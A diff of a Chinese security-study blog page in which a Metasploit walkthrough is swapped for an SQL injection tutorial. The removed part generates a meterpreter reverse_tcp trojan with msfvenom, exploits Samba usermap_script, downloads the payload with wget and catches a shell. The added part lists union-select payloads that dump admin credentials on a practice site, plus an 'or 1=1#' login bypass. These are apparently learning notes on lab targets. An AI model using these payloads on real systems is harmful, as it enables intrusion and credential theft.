@@ -96,21 +96,17 @@
 
 
 
-  <meta name="description" content="#使用msf获得shell">
+  <meta name="description" content="sql注入的本质：是把用户输入的数据当作代码执行。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="msf ：linux后台获取">
-<meta property="og:url" content="http://yoursite.com/2019/03/28/linux-houtai/index.html">
+<meta property="og:title" content="sql注入">
+<meta property="og:url" content="http://yoursite.com/2019/05/30/sql注入/index.html">
 <meta property="og:site_name" content="Welcome to My Blog">
-<meta property="og:description" content="#使用msf获得shell">
+<meta property="og:description" content="sql注入的本质：是把用户输入的数据当作代码执行。">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="c:/Users/Asus/AppData/Roaming/Typora/typora-user-images/1553744073587.png">
-<meta property="og:image" content="c:/Users/Asus/AppData/Roaming/Typora/typora-user-images/1553744994139.png">
-<meta property="og:image" content="c:/Users/Asus/AppData/Roaming/Typora/typora-user-images/1553745094935.png">
-<meta property="og:updated_time" content="2019-04-16T05:28:42.991Z">
+<meta property="og:updated_time" content="2019-06-01T06:05:48.695Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="msf ：linux后台获取">
-<meta name="twitter:description" content="#使用msf获得shell">
-<meta name="twitter:image" content="c:/Users/Asus/AppData/Roaming/Typora/typora-user-images/1553744073587.png">
+<meta name="twitter:title" content="sql注入">
+<meta name="twitter:description" content="sql注入的本质：是把用户输入的数据当作代码执行。">
 
 
 
@@ -118,7 +114,7 @@
 
   
   
-  <link rel="canonical" href="http://yoursite.com/2019/03/28/linux-houtai/">
+  <link rel="canonical" href="http://yoursite.com/2019/05/30/sql注入/">
 
 
 
@@ -128,7 +124,7 @@
   };
 </script>
 
-  <title>msf ：linux后台获取 | Welcome to My Blog</title>
+  <title>sql注入 | Welcome to My Blog</title>
   
 
 
@@ -293,7 +289,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/28/linux-houtai/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/30/sql注入/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="liang">
@@ -310,7 +306,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">msf ：linux后台获取
+          <h1 class="post-title" itemprop="name headline">sql注入
 
               
             
@@ -336,7 +332,7 @@
                 
               
 
-              <time title="Erstellt: 2019-03-28 11:17:31" itemprop="dateCreated datePublished" datetime="2019-03-28T11:17:31+08:00">2019-03-28</time>
+              <time title="Erstellt: 2019-05-30 19:10:20" itemprop="dateCreated datePublished" datetime="2019-05-30T19:10:20+08:00">2019-05-30</time>
             
 
             
@@ -353,7 +349,7 @@
                 
                   <span class="post-meta-item-text">Bearbeitet am</span>
                 
-                <time title="Geändert am: 2019-04-16 13:28:42" itemprop="dateModified" datetime="2019-04-16T13:28:42+08:00">2019-04-16</time>
+                <time title="Geändert am: 2019-06-01 14:05:48" itemprop="dateModified" datetime="2019-06-01T14:05:48+08:00">2019-06-01</time>
               
             
           </span>
@@ -387,37 +383,20 @@
       
 
       
-        <p>#使用msf获得shell<br><a id="more"></a></p>
-<ol>
-<li><p>生成木马：msfvenom -a x86 –platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻 击机IP LPORT=攻击机端口 -f elf -o payload.elf</p>
-</li>
-<li><p>获取shell      </p>
-<p>​    1.打开msfconsole</p>
-<p>​    2.使用nmap扫描目标机开放端口   命令: namp -sV [ip]</p>
-<p>​    3.使用msf中的模块   命令: use multi/samba/usermap_script</p>
-<pre><code>4.设置参数        命令: set payloads cmd/unix/reverse
-</code></pre><p>​        设置目标ip            set rhosts id</p>
-<p>​        设置目标端口            set rport</p>
-<p>​        设置主机ip            set lhost</p>
-<p>​    5.获取shell     命令：run或者exploit</p>
-<p><img src="C:\Users\Asus\AppData\Roaming\Typora\typora-user-images\1553744073587.png" alt="1553744073587"></p>
-<p>​        </p>
-<p>3.开启web服务，将木马下载之目标机中</p>
-<p>​    服务开启命令：python3 -m http.server</p>
-<p>​    在shell中下载  命令： wget <a href="http://id/8000/payload.elf" target="_blank" rel="noopener">http://id/8000/payload.elf</a></p>
-<p>4.使用msf监听听模块        命令: use exploit/mulit/handler</p>
-<p>​        设置payload           命令： set payload linux/x86/meterpreter/reverse_tcp</p>
-<p>​        设置攻击机ip        命令： set lhost ip</p>
-<p>​        运行        run -j</p>
-<p>5.运行木马      ./payload.elf</p>
-<p>​        发现权限不够</p>
-<p>​        更改木马权限  chmod +x payload.elf</p>
-<p><img src="C:\Users\Asus\AppData\Roaming\Typora\typora-user-images\1553744994139.png" alt="1553744994139"></p>
-<p>6.成功获取 meterpreter</p>
-<p><img src="C:\Users\Asus\AppData\Roaming\Typora\typora-user-images\1553745094935.png" alt="1553745094935"></p>
-<p>​    </p>
-</li>
-</ol>
+        <p><centor>sql注入的本质：是把用户输入的数据当作代码执行。</centor><br><a id="more"></a><br>需了解的：<br>order by 语句用于根据指定的列对结果集进行排序（默认升序）<br>limit x,y   x=从第x+1行数据开始 y=取几条数据<br>例子：limit 5，10  将会从第6行数据开始取10行</p>
+<pre><code>database(): 返回当前数据库名
+
+group_concat():返回由一组列值连接组合而成的结果
+ASCII(char)：返回字符的ASCII 码
+version(): 返回mysql服务器版本
+sleep(n): 休眠几秒
+</code></pre><p>sql注入：<br>    显错注入(以靶场猫舍为例)：<br>        加 ‘ 或 “ 判断<br>        分别加 1=1 和 1=2 分析页面是否存在注入<br>        猜字段数：order by x    判断出有多少个字段(2个)<br>        找出字段的回显位置  ——&gt; limit() 为2<br>查库名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,database（）——&gt;(maoshe)</span><br></pre></td></tr></table></figure></p>
+<p>查表名：</p>
+<pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table_name from information_schema.tables where table_schema =&apos;库名&apos;  -&gt;(admin)</span><br></pre></td></tr></table></figure>
+</code></pre><p>查列名：<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">            union select 1,column_name from information_schema.columns where table_schema = &apos;maoshe&apos; and table_name = &apos;admin&apos; limit 1,1#</span><br><span class="line">```  </span><br><span class="line">通过控制limit 0,1 or limit 1,1 or 2,1得到 id，username，password</span><br><span class="line">查字段内容：</span><br></pre></td></tr></table></figure></p>
+<pre><code>id=3 union select 1,group_concat(id,username,password) from admin limit 0,1
+</code></pre><p><code>`</code><br>获得了账号密码</p>
+<p>POST注入：<br>        高危注入点；登陆框，查询框等各种和数据库有交互的框<br>        万能密码：’or 1=1#</p>
 
       
     </div>
@@ -448,8 +427,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/03/07/sqlmap/" rel="next" title="sqlmap">
-                <i class="fa fa-chevron-left"></i> sqlmap
+              <a href="/2019/05/30/信息搜集/" rel="next" title="信息搜集">
+                <i class="fa fa-chevron-left"></i> 信息搜集
               </a>
             
           </div>
@@ -458,8 +437,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/04/13/cs免杀/" rel="prev" title="免杀">
-                免杀 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/06/01/mysql/" rel="prev" title="mysql常用语句">
+                mysql常用语句 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
